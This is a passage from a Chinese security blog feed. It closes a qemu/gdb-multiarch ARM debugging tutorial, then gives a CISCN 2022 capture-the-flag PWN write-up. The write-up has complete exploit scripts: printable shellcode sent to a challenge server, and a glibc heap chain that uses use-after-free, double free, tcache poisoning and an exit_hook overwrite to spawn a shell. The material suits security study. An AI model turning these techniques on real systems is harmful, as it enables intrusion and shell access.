title="安装动态链接库"></a>安装动态链接库</h3><p>我们可以使用如下命令来搜索可安装的动态链接库。这里我们以64位为例，安装debug版本的libc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##搜索libc</span><br>sudo apt search <span class="hljs-string">&quot;libc6&quot;</span> | grep arm<br><span class="hljs-comment">##安装libc</span><br>sudo apt install libc6-dbg-arm64-cross<br></code></pre></td></tr></table></figure><p><img src="/img/article/qemu-arm/qemu2.png" alt="Untitled"></p><p>安装完后，在<code>/usr</code>目录下会出现<code>aarch64-linux-gnu</code>这个文件夹，该文件夹即对应刚安装好的arm64位libc库，之后我们使用下面的命令指定arm程序的动态链接器，即可运行程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./prog<br><span class="hljs-comment">## -g 代表为程序运行分配的进程端口号，一般用于gdb调试，不填时系统自动分配</span><br><span class="hljs-comment">## -L 代表动态链接库的文件夹地址，静态链接程序可以不需要</span><br></code></pre></td></tr></table></figure><p><code>qemu-arm</code>指的是<strong>arm32架构</strong>，用这个命令来运行32位的arm程序，而<code>qemu-aarch64</code>对应的才是<strong>arm64位架构的程序</strong>，上面两者默认都是小端程序；<code>qemu-armeb</code>用来运行<strong>大端的arm程序</strong>。当然在<strong>上面安装包截图中显示的是arm64，其实和aarch64指的是同一种体系结构，只不过命名略有不同</strong>。</p><h2 id="使用gdb-multiarch进行调试"><a href="#使用gdb-multiarch进行调试" class="headerlink" title="使用gdb-multiarch进行调试"></a>使用gdb-multiarch进行调试</h2><p>首先使用如下命令安装gdb-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update<br>sudo apt install gdb-multiarch<br></code></pre></td></tr></table></figure><p>以平台上的ez-arch为例，我们先使用qemu启动程序，并为其分配一个端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./stack<br></code></pre></td></tr></table></figure><p>使用另外一个终端，打开qemu-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[loorain@ubuntu] - [~/dest0g3-520/ez-aarch] - [1568]<br>└─[$] sudo gdb-multiarch                                                                             [22:22:12]<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> architecture aarch64<br>The target architecture is assumed to be aarch64<br>pwndbg&gt; target remote localhost:12345<br>Remote debugging using localhost:12345<br>warning: No executable has been specified and target does not support<br>determining executable automatically.  Try using the <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure><p><img src="/img/article/qemu-arm/qemu3.png" alt="Untitled"></p><p>另外在pwntools中，我们可以使用如下代码来动态调试程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/aarch64-linux-gnu/&quot;</span>, <span class="hljs-string">&quot;./stack&quot;</span>])<br><span class="hljs-comment">##32arm只需要替换指令为qemu-arm，并更换对应的动态链接库</span><br></code></pre></td></tr></table></figure><p><strong>注意：不进行调试时不建议使用</strong><code>-p</code><strong>不然可能会导致程序停滞，只能等待gdb链接</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【CISCN2022】初赛PWN部分writeup</title>
    <link href="/2022/06/04/ciscn2022/"/>
    <url>/2022/06/04/ciscn2022/</url>
    
    <content type="html"><![CDATA[<h1 id="login-normal"><a href="#login-normal" class="headerlink" title="login-normal"></a>login-normal</h1><p>题如其名，一道简单的签到题目，比赛被打烂了。主要在于代码分析，还有可打印shellcode的利用。这里我用的是github上一个大佬的项目AE64，可以用来生成可打印的shellcode，相当好用，强推,链接放在这里。</p><blockquote><p> <a href="https://github.com/veritas501/ae64">veritas501&#x2F;ae64: basic amd64 alphanumeric shellcode encoder (github.com)</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># io = process(&#x27;./login&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;59.110.105.63&#x27;</span>, <span class="hljs-number">29289</span>)<br>payload = <span class="hljs-string">b&#x27;msg:ro0t\r\nopt:1\r\n&#x27;</span><br><br>io.sendline(payload)<br><br>sc = AE64()<br><br>shellocde = sc.encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;rdx&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;msg:&#x27;</span>+shellocde+<span class="hljs-string">b&#x27;\r\nopt:2\r\n&#x27;</span><br><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h1><p> 一道堆题目，比赛结束一个多小时才勉强做出来，非常可惜。主要还是不了解新libc的一些进制了解，临时学了下面这篇文章，才有个初步了解。建议先看完这篇文章，再来看我的wp。</p><blockquote><p> <a href="https://zhuanlan.zhihu.com/p/136983333">Heap Exploit v2.31 | 最新堆利用技巧，速速查收 - 知乎 (zhihu.com)</a><br> <a href="http://blog.nsfocus.net/glibc-234/">浅谈glibc新版本保护机制及绕过方法 – 绿盟科技技术博客 (nsfocus.net)</a></p></blockquote><h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><p>简单看了伪代码后主要有如下几个重点</p><ul><li>free之后没有置空，存在UAF漏洞，可以通过show泄露freechunk的内容</li></ul><p><img src="https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png" alt="img"></p><ul><li><p>没有chunk编辑函数，只能在malloc的时候编辑chunk内容，即无法修改tcache的flag内容。</p></li><li><p>有两个全局变量限制了malloc和free的次数，free仅能11次，malloc次数很多不用太担心。</p></li><li><p>每个chunk的size被限制在0x40。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/641a2a24c6634e648470ba9c17bacca3.png" alt="img"></p><h2 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h2><p>我们来看看可以拿到的信息有哪些。首先，由于新libc的机制，我们可以利用uaf漏洞轻松获取heapbase，这里的key是新libc环境下用来xor操作的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1e140e2c358548f7b56cec373b77f0d8.png" alt="img"></p><p>其次，考虑如何泄露libc，由于存在UAF，我们一般可以通过unsortbin来进行泄露。但是问题在于，每个chunk的size都不够大，即便填满tache也只会进入fastbin，而不是unsortbin。在这里，我想到了两个思路</p><ul><li><p>其一，在程序开头我们输入了一个size，并malloc了一个8*size的chunk用来起到note记录的作用。即这个chunk的size是可控的，<strong>更重要的是这个chunk没有限制大小</strong>如果可以free这个chunk进入unsortbin，便可以实现libc的泄露。但是在这种思路下，考虑填满tcache需要7次free，doublefree控制指针指向notechunk需要2-3次free，泄露libc需要一次free，然后再次doublefree劫持hook。free的次数显然超过11次，暂时无法实现，如果有大佬有方法通过控制开头的notechunk来解出这道题，希望能指点下我😭</p></li><li><p>其二，我们可以尝试伪造一个tcache链，使得其实际size小于0x40，利用溢出构造伪造巨大chunk头并free进入unsortbin，得到libc。同时在这种情况下，我们也可以用溢出轻易完成对freechunk内容的更改，以此劫持hook</p></li></ul><p>下面我们采用第二种思路</p><h3 id="一、得到heapbase"><a href="#一、得到heapbase" class="headerlink" title="一、得到heapbase"></a>一、得到heapbase</h3><p>开始先申请几个chunk，多申请的那几个是用来扩充可控堆区域的大小，为伪造的大chunk提供空间，不然覆盖进topchunk程序会崩掉。这个步骤比较简单，前面也谈到了不过多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><h3 id="二、伪造fastbin链"><a href="#二、伪造fastbin链" class="headerlink" title="二、伪造fastbin链"></a>二、伪造fastbin链</h3><p>这里我们先填满tcache,然后free 7号chunk进入fastbin，结构入下图所示。由于新的libc机制，这里的fd指针都进行了异或操作，所以看起来并不是很直观。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e5ae010babec4989a45fa29018da4cb4.png" alt="img"></p><p>然后申请chunk，此时从tcache中取出最后一个chunk。由于此时tcache中仅剩6个chunk，我们再对7号chunk进行free时，它便会放入tcache中。通过这样的doublefree我们构造了一个即在Tcache又在fastbin的chunk，如下所示。</p><p><img src="https://img-blog.csdnimg.cn/839aa64c464c4ab1a42b524daf40f730.png" alt="img"></p><p> 接下来我们便可以开始构造fake fastbin，需要注意的是fastbin中的fd指针同样需要异或处理，我们可以得到如下结构,此时tcache链长度为0，fastbin的长度为7.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5e6f8e3dac8945b28ddf8b4794c3395f.png" alt="img"></p><h3 id="三、伪造tcache链并泄露libc"><a href="#三、伪造tcache链并泄露libc" class="headerlink" title="三、伪造tcache链并泄露libc"></a>三、伪造tcache链并泄露libc</h3><p> 此时我们调用add()，就会触发fastbin和tcache的stash机制，此时其余6个chunk便会扔到tcache中，其结构如下所示</p><blockquote><p> 当从 fastbin 里取 chunk 时，其余的 chunk 会被依次放入对应的 tcache 中，终止条件时 fastbin 链为空或者 tcache 装满。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/687aa9ca42f04f08895b1958d2ae0c29.png" alt="img"></p><p> 再次add，tcache和fastbin的取出顺序是相反的，即tcache最上方的chunk将被取出，同时编辑内容更改<strong>0x56309de85360</strong>的头部size大小为0x441。之后我们只需要free掉360处的chunk便可泄露libc</p><blockquote><p> fastbin最大为0x410,这里用0x441刚好可以对齐chunk</p></blockquote><p><img src="https://img-blog.csdnimg.cn/60c6e7ed5e2d4633b5226a7183ab38d7.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br></code></pre></td></tr></table></figure><blockquote><p> 这里没有选择freehook或者mallochook是因为没有合适的onegadget，选择劫持exithook</p></blockquote><h3 id="四、劫持exithook"><a href="#四、劫持exithook" class="headerlink" title="四、劫持exithook"></a>四、劫持exithook</h3><p>由于我们在tcache链里折叠了两个chunk这样便可以轻松的更改freechunk的内容，劫持exithook为ongadget然后结束程序便可，最终结构如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6d12cf8cb53c453683ef5ee3ddc6f2d2.png" alt="img"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>    io.send(text)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>pause()<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">## fake tcache</span><br>add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br><br>add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br><br>io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br>io.interactive()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HEAP 攻击方式记录以及总结</title>
    <link href="/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
    <url>/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/</url>
    
